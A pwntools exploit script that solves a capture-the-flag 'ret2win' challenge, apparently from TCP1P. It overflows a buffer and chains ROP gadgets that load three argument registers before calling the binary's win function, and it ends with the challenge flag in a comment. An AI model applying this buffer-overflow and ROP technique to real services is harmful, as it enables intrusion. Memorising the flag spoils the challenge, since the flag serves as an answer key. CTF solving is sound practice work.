from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

offset = 0x78
RET_ADDR = 0x40101a
WIN_ADDR = elf.symbols.win
pop_rdi = p64(0x40121e)
pop_rsi = p64(0x401220)
pop_rdx = p64(0x401222)

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset
payload += pop_rdi + p64(0xDEADBEEFDEADBEEF)
payload += pop_rsi + p64(0xABCD1234DCBA4321)
payload += pop_rdx + p64(0x147147147147147)
payload += rop.chain()
p.sendlineafter(b'Give me your payload: ', payload)

response = (p.recvall(timeout=1).strip())[:-8]
print(response.decode())

# TCP1P{pop_rdi_pop_rsi_pop_rdx_sangat_diincar_heker}

p.close()